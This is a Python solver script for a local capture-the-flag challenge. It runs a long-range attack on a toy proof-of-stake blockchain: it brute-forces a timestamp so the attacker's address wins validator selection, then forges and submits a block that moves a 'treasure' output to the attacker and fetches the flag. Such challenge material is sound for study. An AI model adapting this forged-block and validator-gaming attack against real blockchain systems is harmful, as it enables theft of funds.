import requests
import json
import re
import rsa
import hashlib
import time
import uuid

# Set target URL
base_url = "http://localhost:5001/a1b2c3d4e5f6g"

# Create session object to maintain cookies
session = requests.Session()

# Reuse hash functions from pos_blockchain_ctf.py
def hash(x):
    if isinstance(x, str):
        x = x.encode()
    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()

def hash_reducer(x, y):
    return hash(hash(x) + hash(y))

EMPTY_HASH = '0'*64

# Step 1: Get homepage information
def get_homepage_info():
    response = session.get(f"{base_url}/")
    content = response.text
    
    # Extract genesis block hash
    genesis_match = re.search(r'Hash of genesis block: ([a-f0-9]{64})', content)
    genesis_block_hash = genesis_match.group(1) if genesis_match else None
    
    # Extract addresses
    addresses = {}
    addr_pattern = r'Addresses - Bank: ([a-f0-9]+), Validator1: ([a-f0-9]+), Validator2: ([a-f0-9]+), Validator3: ([a-f0-9]+), Attacker: ([a-f0-9]+), Treasure: ([a-f0-9]+)'
    addr_match = re.search(addr_pattern, content)
    if addr_match:
        addresses = {
            'bank': addr_match.group(1),
            'validator1': addr_match.group(2),
            'validator2': addr_match.group(3),
            'validator3': addr_match.group(4),
            'attacker': addr_match.group(5),
            'treasure': addr_match.group(6)
        }
    
    # Extract UTXO information
    utxo_match = re.search(r'All UTXOs: ({.*})', content)
    try:
        utxo_data = json.loads(utxo_match.group(1)) if utxo_match else None
    except json.JSONDecodeError:
        utxo_data = None
    
    return {
        'genesis_block_hash': genesis_block_hash,
        'addresses': addresses,
        'utxo_data': utxo_data
    }

# Step 2: Get attacker private key
def get_attacker_key():
    response = session.get(f"{base_url}/get_attacker_key")
    content = response.text
    
    # Extract private key
    key_match = re.search(r'Attacker private key \(for educational purposes\): ([a-f0-9]+)', content)
    if key_match:
        privkey_hex = key_match.group(1)
        try:
            privkey_bytes = bytes.fromhex(privkey_hex)
            attacker_privkey = rsa.PrivateKey.load_pkcs1(privkey_bytes)
            return attacker_privkey
        except Exception as e:
            print(f"Failed to load private key: {e}")
            return None
    return None

# Step 3: Find treasure UTXO
def find_treasure_utxo(utxos, treasure_address):
    for utxo_id, utxo in utxos.items():
        if utxo['addr'] == treasure_address and utxo['amount'] == 1000000:
            return utxo_id, utxo
    return None, None

def find_attacker_validator_time(genesis_hash, utxos, attacker_addr, time_range=86400):
    # Calculate total stake
    total_stake = 0
    stakes = {}
    validator_addresses = [
        utxos[list(utxos.keys())[0]]['addr'],  # bank
        utxos[list(utxos.keys())[1]]['addr'],  # validator1
        utxos[list(utxos.keys())[2]]['addr'],  # validator2
        utxos[list(utxos.keys())[3]]['addr'],  # validator3
        attacker_addr  # attacker
    ]
    
    for utxo in utxos.values():
        addr = utxo['addr']
        if addr in validator_addresses:
            if addr not in stakes:
                stakes[addr] = 0
            stakes[addr] += utxo['amount']
            total_stake += utxo['amount']
    
    if total_stake == 0:
        return None
    
    # Try timestamps
    base_time = int(time.time())
    for offset in range(-time_range, time_range):
        timestamp = base_time + offset
        seed = hash(genesis_hash + str(timestamp))
        random_val = int(seed, 16) % total_stake
        
        cumulative = 0
        selected_validator = None
        for addr, stake in stakes.items():
            cumulative += stake
            if random_val < cumulative:
                selected_validator = addr
                break
        
        if selected_validator == attacker_addr:
            print(f"Find a correct timestamp: {timestamp}")
            return timestamp
    
    return base_time


# Reuse functions from pos_blockchain_ctf.py
def create_output_utxo(addr_to, amount):
    utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount}
    utxo['hash'] = hash_reducer(hash_reducer(utxo['id'], utxo['addr']), str(utxo['amount']))
    return utxo

def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
    signatures = []
    if privkey_from:
        for utxo_id in input_utxo_ids:
            signatures.append(rsa.sign(utxo_id.encode(), privkey_from, 'SHA-1').hex())
    tx = {'input': input_utxo_ids, 'signature': signatures, 'output': output_utxo}
    
    # Calculate transaction hash
    if tx['input']:
        input_hash = tx['input'][0]
        for i in range(1, len(tx['input'])):
            input_hash = hash_reducer(input_hash, tx['input'][i])
    else:
        input_hash = EMPTY_HASH
    
    if tx['output']:
        output_hashes = [utxo['hash'] for utxo in tx['output']]
        output_hash = output_hashes[0]
        for i in range(1, len(output_hashes)):
            output_hash = hash_reducer(output_hash, output_hashes[i])
    else:
        output_hash = EMPTY_HASH
    
    tx['hash'] = hash_reducer(input_hash, output_hash)
    return tx

def hash_block(block):
    tx_hashes = [tx['hash'] for tx in block['transactions']] if block['transactions'] else []
    if tx_hashes:
        tx_hash = tx_hashes[0]
        for i in range(1, len(tx_hashes)):
            tx_hash = hash_reducer(tx_hash, tx_hashes[i])
    else:
        tx_hash = EMPTY_HASH
    return hash_reducer(hash_reducer(hash_reducer(block['prev'], block['validator']), str(block['timestamp'])), tx_hash)

def sign_block(block_hash, privkey):
    return rsa.sign(block_hash.encode(), privkey, 'SHA-1').hex()

def create_block(prev_block_hash, validator_address, timestamp, transactions, signature):
    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')
    block = {
        'prev': prev_block_hash, 
        'validator': validator_address,
        'timestamp': timestamp,
        'transactions': transactions,
        'signature': signature
    }
    block['hash'] = hash_block(block)
    return block

# Step 4: Execute long range attack
def execute_long_range_attack():
    print("=== Starting long range attack ===")
    
    # 1. Get necessary information
    print("1. Getting homepage information...")
    homepage_info = get_homepage_info()
    genesis_hash = homepage_info['genesis_block_hash']
    addresses = homepage_info['addresses']
    utxos = homepage_info['utxo_data']
    
    # 2. Get attacker private key
    print("2. Getting attacker private key...")
    attacker_privkey = get_attacker_key()
    if not attacker_privkey:
        print("Failed to get attacker private key")
        return
    
    # 3. Find treasure UTXO
    print("3. Finding treasure UTXO...")
    treasure_utxo_id, treasure_utxo = find_treasure_utxo(utxos, addresses['treasure'])
    if not treasure_utxo_id:
        print("Treasure UTXO not found")
        return
    
    # 4. Create a transaction to transfer treasure to ourselves
    print("4. Creating transaction to transfer treasure...")
    transfer_treasure_tx = create_tx(
        [treasure_utxo_id],  # Input treasure UTXO
        [create_output_utxo(addresses['attacker'], 1000000)],  # Output to attacker
        attacker_privkey  # Sign with attacker private key
    )
    
    # 5. Create new block from genesis
    print("5. Creating new block from genesis...")
    # Use a fixed timestamp to ensure we're selected as validator
    # attack_timestamp = int(time.time()) - 86400  # 24 hours ago like genesis
    attack_timestamp = find_attacker_validator_time(genesis_hash, utxos, addresses['attacker'])
    
    new_block = {
        'prev': genesis_hash,
        'validator': addresses['attacker'],
        'timestamp': attack_timestamp,
        'transactions': [transfer_treasure_tx],
        'signature': ''
    }
    
    # Calculate block hash (excluding signature)
    block_hash = hash_block(new_block)
    
    # Sign block with attacker private key
    signature = sign_block(block_hash, attacker_privkey)
    
    # Create final block
    attack_block = create_block(
        genesis_hash,
        addresses['attacker'],
        attack_timestamp,
        [transfer_treasure_tx],
        signature
    )
    attack_block['height'] = 1
    
    print(f"Attack block hash: {attack_block['hash']}")
    
    # 6. Submit block
    print("6. Submitting block...")
    response = session.post(f"{base_url}/submit_block", json=attack_block)
    print(f"Block submission result: {response.text}")
    
    # 7. Check if attack succeeded
    print("7. Checking results...")
    response = session.get(f"{base_url}/flag")
    print(f"Flag result: {response.text}")

    # 8. Print Session cookie
    print("\n8. Session Cookie:")
    if session.cookies:
        for cookie in session.cookies:
            print(f"  {cookie.name}: {cookie.value}")
    else:
        print("Cookie Not Found")

# Execute attack
execute_long_range_attack()